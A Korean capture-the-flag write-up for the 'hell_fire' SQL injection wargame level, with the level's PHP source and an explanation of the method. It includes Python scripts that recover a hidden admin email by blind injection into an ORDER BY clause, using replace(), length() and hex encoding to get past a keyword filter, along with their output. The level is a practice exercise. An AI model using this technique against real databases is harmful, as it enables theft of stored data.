# hell_fire

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- GET 파라미터 `order`을 받고, 쿼리 속 마지막 `order by`뒤에 붙인다.
- 쿼리 결과를 테이블로 보여주는데, admin의 email은 공개하지 않는다.
- 정확한 admin email값을 알아내면 해결된다.   

## 3. Solution
`order by`에 함수를 넣을 수 있음을 이용하였다.   
&rarr; 값을 원하는 대로 변경 후, 비교가능하다.   

rubiya email값을 하나씩 바꿔보며 한 문자씩 찾아보자.   
`.`, `_`등 email값 전달에 제약이 있으므로, hex값으로 우회하여 보냈다.   
 

이용한 함수는 위 두개이다.
- length
- replace   
&rarr; replace(컬럼,바꿀값,바뀔값)   


admin과 rubiya가 표에 정렬되는 순서로 blind-sqli를 진행하였다.
mysql은 기본적으로 ascii값에 의거 정렬하기에 찾기 수훨했다.
&rarr; 이따 다시 다루겠지만, 아쉽게도 대소문자는 기본적으로 무시한다.



#### a. 길이 구하기
변수명 | 값
---|---
`order` | length(replace(email,`0x72756269796138303540676d61696c2e636d`,`!!!!`))   

>    replace의 두 번째 인자는 `rubiya805@gmail.cm`를 hex값변환 한 것이다.   
    세 번째 인자 `!`는 점차 개수를 늘려가며 admin email의 길이와 비교하였다.     
    

```python
import requests
import binascii

cookie = {'PHPSESSID' : '~~~~'}

def str2hex(string_1):
    return binascii.hexlify(string_1.encode('utf-8')).decode('utf-8')



rubiya_email = "rubiya805@gmail.cm"
for i in range(1,101):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
            order=length(replace(email,0x%s,\'%s\'))" % (str2hex(rubiya_email), '!'*i)
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
        email_len = i-1
        print("Length of pw : %d" % email_len)
        break
```   

>    실행 결과는 다음과 같다.   

```
Length of pw : 28
```   


#### b. 값 구하기
변수명 | 값
---|---
`order` | replace(email,`0x72756269796138303540676d61696c2e636d`,`admin_email...`)   

>    마찬가지로, `replace`를 이용하여 하나하나 비교하였다.   
    정렬되는 순서로 판단하였다.   
    
    구체적으로 설명하자면 rubiya email의 아스키값을 하나하나 늘려가며 admin email이 먼저 정렬되는 순간을 노렸다.   
    
    `a. 길이 구하기` 코드 아래에 붙여주었다.
    
```python
tmp_admin_email = ""
for i in range(email_len):
    for j in range(32,1000):
        hex_rubiya = str2hex(tmp_admin_email+chr(j))
        url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
                order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), hex_rubiya)
        res = requests.get(url, cookies=cookie)

        if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
            tmp_admin_email += chr(j-1)
            print("email(%d) : %s" % (i+1, tmp_admin_email))
            break
```   

>    실행 결과는 다음과 같다.   

```
Length of pw : 28
email(1) : A
email(2) : AD
email(3) : ADM
email(4) : ADMI
email(5) : ADMIN
email(6) : ADMIN_
email(7) : ADMIN_S
email(8) : ADMIN_SE
email(9) : ADMIN_SEC
email(10) : ADMIN_SECU
email(11) : ADMIN_SECUR
email(12) : ADMIN_SECURE
email(13) : ADMIN_SECURE_
email(14) : ADMIN_SECURE_E
email(15) : ADMIN_SECURE_EM
email(16) : ADMIN_SECURE_EMA
email(17) : ADMIN_SECURE_EMAI
email(18) : ADMIN_SECURE_EMAIL
email(19) : ADMIN_SECURE_EMAIL@
email(20) : ADMIN_SECURE_EMAIL@E
email(21) : ADMIN_SECURE_EMAIL@EM
email(22) : ADMIN_SECURE_EMAIL@EMA
email(23) : ADMIN_SECURE_EMAIL@EMAI
email(24) : ADMIN_SECURE_EMAIL@EMAI1
email(25) : ADMIN_SECURE_EMAIL@EMAI1.
email(26) : ADMIN_SECURE_EMAIL@EMAI1.C
email(27) : ADMIN_SECURE_EMAIL@EMAI1.CO
email(28) : ADMIN_SECURE_EMAIL@EMAI1.COM
```   


#### c. 대소문자 판별
변수명 | 값
---|---
`order` | replace(email,`0x72756269796138303540676d61696c2e636d`,`admin email의 upper`)   

>    `b. 값 구하기`에서 나온 값을 입력해도 문제가 해결되지 않을것이다.   
    그 이유는 아까 언급했듯이, order by는 기본적으로 대소문자 상관없이 정렬하기 때문이다.    
    
    데이터베이스 속 `admin - rubiya` 순으로 저장되어있다.   
    이를 이용하여 rubiya email을 `b. 값 구하기`에서 나온값의 `upper case로 세팅`해준 후, 정렬한다면   
    다음 두 가지의 경우가 발생할 수 있는 것이다.      
    1.admin email이 대문자일 경우 &rarr admin 먼저 정렬
    2.admin email이 소문자일 경우 &rarr rubiya 먼저 정렬   
    
    
    대소문자 구별 부분코드를 최종적으로 붙여 스크립트를 완성하였다.   
    아래는 대소문자 구별 부분코드이다.   
    
```python
final_admin_email = ""
print("-----------------------------------------------")
print("| admin email | ", end="")
for i in range(email_len):
    url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?\
            order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), str2hex(final_admin_email + tmp_admin_email[i].upper()))
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>200</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr>" in res.text:
        final_admin_email += tmp_admin_email[i].upper()
    
    else:
        final_admin_email += tmp_admin_email[i].lower()
    
    print("%s" % (final_admin_email[i]), end="")
    
print("\n-----------------------------------------------")
```    
>    결과는 다음과 같다.   
```
Length of pw : 28
email(1) : A
email(2) : AD
email(3) : ADM
email(4) : ADMI
email(5) : ADMIN
email(6) : ADMIN_
email(7) : ADMIN_S
email(8) : ADMIN_SE
email(9) : ADMIN_SEC
email(10) : ADMIN_SECU
email(11) : ADMIN_SECUR
email(12) : ADMIN_SECURE
email(13) : ADMIN_SECURE_
email(14) : ADMIN_SECURE_E
email(15) : ADMIN_SECURE_EM
email(16) : ADMIN_SECURE_EMA
email(17) : ADMIN_SECURE_EMAI
email(18) : ADMIN_SECURE_EMAIL
email(19) : ADMIN_SECURE_EMAIL@
email(20) : ADMIN_SECURE_EMAIL@E
email(21) : ADMIN_SECURE_EMAIL@EM
email(22) : ADMIN_SECURE_EMAIL@EMA
email(23) : ADMIN_SECURE_EMAIL@EMAI
email(24) : ADMIN_SECURE_EMAIL@EMAI1
email(25) : ADMIN_SECURE_EMAIL@EMAI1.
email(26) : ADMIN_SECURE_EMAIL@EMAI1.C
email(27) : ADMIN_SECURE_EMAIL@EMAI1.CO
email(28) : ADMIN_SECURE_EMAIL@EMAI1.COM
-----------------------------------------------
| admin email | admin_secure_email@emai1.com
-----------------------------------------------
```   


나온 값, `admin_secure_email@emai1.com`을 GET 파라미터 `email`에 넣어주면 문제가 해결된다.   
변수명 | 값
---|---
`email` | admin_secure_email@emai1.com